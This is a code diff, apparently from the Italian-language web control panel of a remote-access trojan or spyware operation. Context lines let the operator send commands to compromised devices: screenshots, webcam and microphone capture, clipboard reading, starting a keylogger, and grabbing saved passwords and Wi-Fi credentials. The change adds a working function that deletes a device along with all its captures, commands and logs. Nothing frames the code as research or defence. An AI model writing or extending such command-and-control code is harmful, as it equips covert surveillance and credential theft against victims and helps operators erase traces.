@@ -350,7 +350,49 @@
 
         function sendCommand(id) { const cmd=prompt('📡 Invia comando a '+id.substring(0,8)+'...\n\nscreenshot\nwebcam\nmic\nclipboard\nkeylogger_start\ngrab_passwords\ngrab_wifi\nlist_files C:\\','screenshot'); if(cmd){ fetch(`/api/command/${id}`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:cmd,params:''})}).then(()=>alert('✅ Comando inviato')).catch(()=>alert('❌ Errore')); } }
         function viewDevice(id) { alert('👁️ Dettagli dispositivo: '+id); }
-        function removeDevice(id) { if(confirm('⚠️ Rimuovere '+id.substring(0,8)+'...?')){ alert('✅ Dispositivo rimosso'); refreshDevices(); } }
+        function removeDevice(id) {
+    if (!id) {
+        alert('❌ ID dispositivo non valido');
+        return;
+    }
+    
+    if (confirm('⚠️ Rimuovere il dispositivo ' + id.substring(0, 8) + '...?\n\n' +
+                'Verranno eliminati:\n' +
+                '• Il dispositivo\n' +
+                '• Tutte le catture associate\n' +
+                '• Tutti i comandi associati\n' +
+                '• Tutti i log associati\n\n' +
+                'Questa operazione è irreversibile!')) {
+        
+        fetch('/api/device/' + id, {
+            method: 'DELETE',
+            headers: {
+                'Content-Type': 'application/json'
+            }
+        })
+        .then(function(res) {
+            if (!res.ok) {
+                return res.json().then(function(data) {
+                    throw new Error(data.error || 'Errore sconosciuto');
+                });
+            }
+            return res.json();
+        })
+        .then(function(data) {
+            if (data.status === 'deleted') {
+                alert('✅ Dispositivo rimosso con successo!');
+                refreshDevices();
+                refreshStats();
+            } else {
+                alert('❌ Errore: ' + (data.error || 'Operazione fallita'));
+            }
+        })
+        .catch(function(err) {
+            console.error('Errore eliminazione:', err);
+            alert('❌ Errore: ' + err.message);
+        });
+    }
+}
 
         function updateTime() { document.getElementById('footerTime').textContent = new Date().toLocaleTimeString('it-IT'); }
         refreshAll(); setInterval(()=>{ refreshDevices(); refreshStats(); refreshCharts(); },15000); setInterval(updateTime,1000); updateTime();
